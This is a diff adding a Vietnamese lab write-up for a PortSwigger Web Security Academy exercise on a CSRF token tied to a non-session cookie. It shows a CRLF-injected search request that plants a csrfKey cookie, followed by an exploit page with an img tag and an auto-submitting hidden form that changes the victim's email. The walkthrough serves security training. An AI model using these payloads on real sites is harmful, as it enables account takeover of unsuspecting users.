@@ -49,6 +49,35 @@ Ta đăng nhập lại tài khoản wiener:peter, lưu lại csrf token là `w9l
 Sau khi click "Deliver to victim", bài lab được giải thành công.
 
 # 5. CSRF where token is tied to non-session cookie
+Ta thấy trong form thay đổi email có chứa csrf token, tuy nhiên token này phụ thuộc vào cookie `csrfKey`, miễn là `csrfKey` và thuộc tính `csrf` phù hợp với nhau thì có thể submit thành công.
+
+Trong chức năng search của website, thử `/?search=abc` thì thấy trong response có header `Set-Cookie: LastSearchTerm=abc; Secure; HttpOnly`. Ta sẽ thử xem có thể thiết lập một cookie mới với chức năng Search hay không. Gửi request `GET /?search=abc%0D%0ASet-Cookie:+abc%3Ddef`, ta thấy header `Set-Cookie` trong response đã bị xuống dòng và thêm một header Set-Cookie mới:
+
+![image](https://user-images.githubusercontent.com/103978452/209636281-7492097f-eaf0-4cda-bf42-fcd4fbda9dd6.png)
+
+Như vậy, ta thử ghi đè lên cookie csrfKey bằng cách gửi request: `GET /?search=abc%0D%0ASet-Cookie%3A+csrfKey%3D4tSIrRxNcvsF3dGtffgvaYuQI6DOfybx%3B+Path%3D%2F%3B+SameSite%3DNone`.
+
+Kết quả như sau:
+
+![image](https://user-images.githubusercontent.com/103978452/209636456-760b8977-96e6-4c40-85f9-94220d22f43b.png)
+
+Như vậy, ta có thể thay đổi cookie csrfKey của nạn nhân. Ta có kịch bản tấn công như sau:
+
+1) Từ session của mình, lấy ra cookie `csrfKey=4tSIrRxNcvsF3dGtffgvaYuQI6DOfybx` và token `csrf=Bt0qvdZVXoUpfTmoDGy54RJIxytRR1SP`
+2) Dùng tag `<img>` để thay đổi cookie `csrfKey` của nạn nhân
+3) Gửi request đổi email với csrf token đã có
+
+Vào exploit server và cấu hình đoạn HTML sau:
+```
+<img src="https://0aa900e403ad1a02c0b0125d00b000d9.web-security-academy.net/?search=abc%0D%0ASet-Cookie%3A+csrfKey%3D4tSIrRxNcvsF3dGtffgvaYuQI6DOfybx%3B+Path%3D%2F%3B+SameSite%3DNone">
+<form id="form" method="POST" action="https://0aa900e403ad1a02c0b0125d00b000d9.web-security-academy.net/my-account/change-email">
+<input type="hidden" value="attacker00022@gmail.com" name="email">
+<input type="hidden" value="Bt0qvdZVXoUpfTmoDGy54RJIxytRR1SP" name="csrf">
+</form>
+<script>form.submit()</script>
+```
+
+Sau khi click "Deliver to victim", kết quả thành công.
 
 # 6. CSRF where token is duplicated in cookie
 
